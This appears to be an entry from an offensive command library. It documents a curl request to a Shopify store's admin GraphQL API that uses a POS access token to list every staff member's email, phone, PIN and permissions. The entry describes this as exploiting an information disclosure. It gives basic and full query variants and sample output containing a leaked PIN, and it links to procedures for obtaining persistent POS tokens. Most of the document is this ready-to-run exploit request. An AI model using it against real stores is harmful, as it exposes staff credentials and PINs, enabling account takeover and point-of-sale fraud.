---
id: cmd-shopify-graphql-staff-001
data: >-
  curl -X POST
  https://h1-2102-ramsexy.myshopify.com/admin/api/unversioned/graphql -H
  "Content-Type: application/json" -H "X-Shopify-Access-Token: shpat_..." -d
  '{"query":"fragment RemoteStaffMember on StaffMember { __typename active email
  name firstName lastName phone pin id isShopOwner accountType permissions {
  __typename userPermissions } privateData { __typename updatedAt identityOwned
  identityUuid } retailData(location: $locationID) { __typename canInitializePos
  posAccess retailRole { __typename ... RemoteRetailRole } } } fragment
  RemoteRetailRole on RetailRole { __typename id name isDefault: default hidden
  updatedAt retailRolePermissions { __typename ... RemoteRetailRolePermission }
  } fragment RemoteRetailRolePermission on RetailRolePermission { __typename
  access retailPermissionTag } query StaffList($first: Int, $after: String,
  $query: String, $locationID: ID) { __typename shop { __typename
  staffMembers(first: $first, after: $after, query: $query) { __typename edges {
  __typename node { __typename ... RemoteStaffMember } cursor } pageInfo {
  __typename hasNextPage } } }
  }","variables":{"first":100,"query":"updated_at:>1970-01-01T00:00:00Z"}}'
tags:
  - graphql
  - query
  - disclosure
  - staff
type: command
output: null
executor: bash
platforms:
  - Web
  - Shopify
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.593Z'
verified: false
validated: true
submitted: true
---
# shopify-graphql-staff-query

## Command

```bash
curl -X POST https://h1-2102-ramsexy.myshopify.com/admin/api/unversioned/graphql \
  -H "Content-Type: application/json" \
  -H "X-Shopify-Access-Token: shpat_..." \
  -d '{"query":"fragment RemoteStaffMember on StaffMember { __typename active email name firstName lastName phone pin id isShopOwner accountType permissions { __typename userPermissions } privateData { __typename updatedAt identityOwned identityUuid } retailData(location: $locationID) { __typename canInitializePos posAccess retailRole { __typename ... RemoteRetailRole } } } fragment RemoteRetailRole on RetailRole { __typename id name isDefault: default hidden updatedAt retailRolePermissions { __typename ... RemoteRetailRolePermission } } fragment RemoteRetailRolePermission on RetailRolePermission { __typename access retailPermissionTag } query StaffList($first: Int, $after: String, $query: String, $locationID: ID) { __typename shop { __typename staffMembers(first: $first, after: $after, query: $query) { __typename edges { __typename node { __typename ... RemoteStaffMember } cursor } pageInfo { __typename hasNextPage } } } }","variables":{"first":100,"query":"updated_at:>1970-01-01T00:00:00Z"}}'
```

## Description

Queries Shopify's GraphQL API using a POS token to retrieve staff members' sensitive details, including PINs, exploiting information disclosure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| query | GraphQL query string with fragments for StaffList | Yes |
| variables | JSON object with first (limit) and query (filter) | Yes |
| X-Shopify-Access-Token | POS access token from authentication | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://example.myshopify.com/admin/api/unversioned/graphql -H "Content-Type: application/json" -H "X-Shopify-Access-Token: shpat_abc" -d '{"query":"query StaffList { shop { staffMembers(first:10) { edges { node { name } } } } }","variables":{}}'
```

### Advanced Usage

Full query for all staff with sensitive fields, as in the data.

## Expected Output

JSON: {"data":{"shop":{"staffMembers":{"edges":[{"node":{"active":true,"email":"mgr@example.com","pin":"3333",...}}]}}}};

## Related

- [[procedures/Disclose-Staff-PINs-via-GraphQL]]
- [[procedures/Obtain-Persistent-POS-Access-Token]]
